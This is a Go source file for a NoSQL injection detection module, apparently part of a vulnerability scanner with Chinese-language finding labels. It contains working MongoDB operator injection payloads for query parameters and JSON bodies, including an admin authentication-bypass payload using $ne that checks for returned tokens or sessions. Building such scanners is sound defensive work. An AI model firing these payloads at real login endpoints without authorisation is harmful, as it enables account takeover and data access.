package nosqli

import (
	"context"
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"

	"vulnscan-backend/model"
	"vulnscan-backend/pkg/payload"
	"vulnscan-backend/scan/engine"
)

type NoSQLiScanner struct {
	base     *engine.VulnScanner
	payloads *payload.Loader
}

func New(loader *payload.Loader) *NoSQLiScanner {
	return &NoSQLiScanner{payloads: loader}
}

func (m *NoSQLiScanner) ID() string       { return "nosqli" }
func (m *NoSQLiScanner) Name() string     { return "NoSQL 注入检测" }
func (m *NoSQLiScanner) Category() string { return "vuln" }

func (m *NoSQLiScanner) Params() []engine.ModuleParam {
	return []engine.ModuleParam{engine.VulnVerificationParam()}
}

var mongoErrorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)MongoError`),
	regexp.MustCompile(`(?i)MongoDB.*error`),
	regexp.MustCompile(`(?i)\$[a-z]+.*not.*allowed`),
	regexp.MustCompile(`(?i)CastError.*ObjectId`),
	regexp.MustCompile(`(?i)SyntaxError.*JSON`),
	regexp.MustCompile(`(?i)CouchDB.*error`),
	regexp.MustCompile(`(?i)illegal.*operator`),
	regexp.MustCompile(`(?i)bad.*query`),
}

func (m *NoSQLiScanner) getOperatorPayloads() []string {
	if m.payloads != nil {
		dbPayloads := m.payloads.GetPayloads("nosqli")
		var result []string
		for _, p := range dbPayloads {
			if p.Type == "basic" || p.Type == "operator" {
				result = append(result, p.Value)
			}
		}
		if len(result) > 0 {
			return result
		}
	}
	return defaultOperatorPayloads()
}

func defaultOperatorPayloads() []string {
	return []string{
		"[$gt]",
		"[$ne]=",
		"[$regex]=.*",
		"[$exists]=true",
	}
}

func (m *NoSQLiScanner) Run(ctx context.Context, targets []*engine.Target, config map[string]interface{}) (*engine.ModuleResult, error) {
	m.base = engine.NewVulnScanner(config)
	verifyLevel := engine.GetConfigValue(config, "verification_level", "both")

	result := m.base.RunTargets(ctx, m.ID(), targets, func(ctx context.Context, target *engine.Target) []*engine.Finding {
		return m.testTarget(ctx, target, verifyLevel)
	})

	engine.LogModuleComplete(m.ID(), len(targets), len(result.Findings), result.Duration)
	return result, nil
}

func (m *NoSQLiScanner) testTarget(ctx context.Context, target *engine.Target, verifyLevel string) []*engine.Finding {
	var findings []*engine.Finding

	parsed, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	params := parsed.Query()

	if len(params) > 0 {
		if engine.ShouldRunPrinciple(verifyLevel) {
			findings = append(findings, m.testQueryParamErrorBased(ctx, target, parsed, params)...)
		}
		if engine.ShouldRunExploit(verifyLevel) {
			findings = append(findings, m.testQueryParamBooleanBlind(ctx, target, parsed, params)...)
		}
	}

	if engine.ShouldRunPrinciple(verifyLevel) {
		if f := m.testJSONOperatorInjection(ctx, target); f != nil {
			findings = append(findings, f)
		}
	}

	if engine.ShouldRunExploit(verifyLevel) {
		if f := m.testJSONAuthBypass(ctx, target); f != nil {
			findings = append(findings, f)
		}
	}

	return findings
}

func (m *NoSQLiScanner) testQueryParamErrorBased(ctx context.Context, target *engine.Target, u *url.URL, params url.Values) []*engine.Finding {
	var findings []*engine.Finding

	for param := range params {
		for _, suffix := range m.getOperatorPayloads() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			q := u.Query()
			q.Del(param)
			testURL := u.Scheme + "://" + u.Host + u.Path + "?" + q.Encode()
			if q.Encode() != "" {
				testURL += "&"
			}
			testURL += param + suffix

			body := m.base.FetchBody(ctx, testURL)
			if body == "" {
				continue
			}

			for _, pattern := range mongoErrorPatterns {
				if pattern.MatchString(body) {
					findings = append(findings, &engine.Finding{
						ModuleID:           m.ID(),
						Target:             target,
						Type:               "nosqli_error",
						Title:              fmt.Sprintf("NoSQL注入(Error-based) - 参数: %s", param),
						Description:        fmt.Sprintf("参数 %s 注入 %s 触发NoSQL数据库错误", param, suffix),
						Severity:           "high",
						Confidence:         75,
						Evidence:           engine.Truncate(body, 500),
						VerificationLevel:  engine.VerifyPrinciple,
						VerificationDetail: "nosql-error-detected",
						Timestamp:          time.Now(),
						Data: map[string]string{
							"param":   param,
							"payload": suffix,
							"type":    "nosqli-error",
						},
					})
					break
				}
			}
		}
	}

	return findings
}

func (m *NoSQLiScanner) testQueryParamBooleanBlind(ctx context.Context, target *engine.Target, u *url.URL, params url.Values) []*engine.Finding {
	var findings []*engine.Finding
	baseBody := m.base.FetchBody(ctx, target.URL)

	for param := range params {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		q1 := u.Query()
		q1.Del(param)
		trueURL := u.Scheme + "://" + u.Host + u.Path + "?" + q1.Encode()
		if q1.Encode() != "" {
			trueURL += "&"
		}
		trueURL += param + "[$ne]=__impossible_value_12345__"

		q2 := u.Query()
		q2.Del(param)
		falseURL := u.Scheme + "://" + u.Host + u.Path + "?" + q2.Encode()
		if q2.Encode() != "" {
			falseURL += "&"
		}
		falseURL += param + "[$eq]=__impossible_value_12345__"

		trueBody := m.base.FetchBody(ctx, trueURL)
		falseBody := m.base.FetchBody(ctx, falseURL)

		if trueBody == "" || falseBody == "" {
			continue
		}

		trueSimilar := engine.Similarity(baseBody, trueBody) > 0.7
		falseDifferent := engine.Similarity(baseBody, falseBody) < 0.5
		tfDifferent := engine.Similarity(trueBody, falseBody) < 0.5

		if trueSimilar && falseDifferent && tfDifferent {
			findings = append(findings, &engine.Finding{
				ModuleID:           m.ID(),
				Target:             target,
				Type:               "nosqli_boolean",
				Title:              fmt.Sprintf("NoSQL注入(Boolean-blind) - 参数: %s", param),
				Description:        fmt.Sprintf("参数 %s 使用 $ne/$eq 运算符注入导致响应显著差异", param),
				Severity:           "high",
				Confidence:         80,
				VerificationLevel:  engine.VerifyExploit,
				VerificationDetail: "boolean-response-diff",
				Timestamp:          time.Now(),
				Data: map[string]string{
					"param": param,
					"type":  "nosqli-boolean",
				},
			})
		}
	}

	return findings
}

func (m *NoSQLiScanner) testJSONOperatorInjection(ctx context.Context, target *engine.Target) *engine.Finding {
	payloads := []string{
		`{"username":{"$gt":""},"password":{"$gt":""}}`,
		`{"username":{"$ne":""},"password":{"$ne":""}}`,
		`{"username":{"$regex":".*"},"password":{"$regex":".*"}}`,
	}

	if m.payloads != nil {
		dbPayloads := m.payloads.GetPayloads("nosqli")
		var dbPayloadsList []string
		for _, p := range dbPayloads {
			if p.Type == "basic" || p.Type == "operator" {
				if json.Valid([]byte(p.Value)) {
					dbPayloadsList = append(dbPayloadsList, p.Value)
				}
			}
		}
		if len(dbPayloadsList) > 0 {
			payloads = dbPayloadsList
		}
	}

	for _, payload := range payloads {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		if !json.Valid([]byte(payload)) {
			continue
		}

		body, _ := m.base.SendJSON(ctx, target.URL, payload)
		if body == "" {
			continue
		}

		for _, pattern := range mongoErrorPatterns {
			if pattern.MatchString(body) {
				return &engine.Finding{
					ModuleID:           m.ID(),
					Target:             target,
					Type:               "nosqli_operator",
					Title:              "NoSQL JSON运算符注入",
					Description:        "JSON请求体中注入MongoDB运算符触发数据库错误",
					Severity:           "high",
					Confidence:         75,
					Evidence:           engine.Truncate(body, 500),
					VerificationLevel:  engine.VerifyPrinciple,
					VerificationDetail: "operator-error-detected",
					Timestamp:          time.Now(),
					Data: map[string]string{
						"payload": payload,
						"url":     target.URL,
						"type":    "nosqli-json-operator",
					},
				}
			}
		}
	}

	return nil
}

func (m *NoSQLiScanner) testJSONAuthBypass(ctx context.Context, target *engine.Target) *engine.Finding {
	normalPayload := `{"username":"admin","password":"wrong_password_12345"}`
	normalBody, _ := m.base.SendJSON(ctx, target.URL, normalPayload)

	bypassPayload := `{"username":"admin","password":{"$ne":""}}`
	bypassBody, _ := m.base.SendJSON(ctx, target.URL, bypassPayload)

	if normalBody == "" || bypassBody == "" {
		return nil
	}

	normalLen := len(normalBody)
	bypassLen := len(bypassBody)
	diff := bypassLen - normalLen
	if diff < 0 {
		diff = -diff
	}

	bypassHasToken := strings.Contains(bypassBody, "token") || strings.Contains(bypassBody, "session") || strings.Contains(bypassBody, "access")
	normalHasError := strings.Contains(strings.ToLower(normalBody), "error") || strings.Contains(strings.ToLower(normalBody), "invalid") || strings.Contains(strings.ToLower(normalBody), "fail")

	if bypassHasToken && normalHasError && float64(diff)/float64(max(normalLen, 1)) > 0.3 {
		return &engine.Finding{
			ModuleID:           m.ID(),
			Target:             target,
			Type:               "nosqli_auth_bypass",
			Title:              "NoSQL 认证绕过",
			Description:        "通过MongoDB $ne运算符绕过认证，获取到token/session",
			Severity:           "critical",
			Confidence:         88,
			Evidence:           engine.Truncate(bypassBody, 500),
			VerificationLevel:  engine.VerifyExploit,
			VerificationDetail: "auth-bypass-confirmed",
			Timestamp:          time.Now(),
			Data: map[string]string{
				"url":  target.URL,
				"type": "nosqli-auth-bypass",
			},
		}
	}

	return nil
}

var _ = model.VulnPayload{}
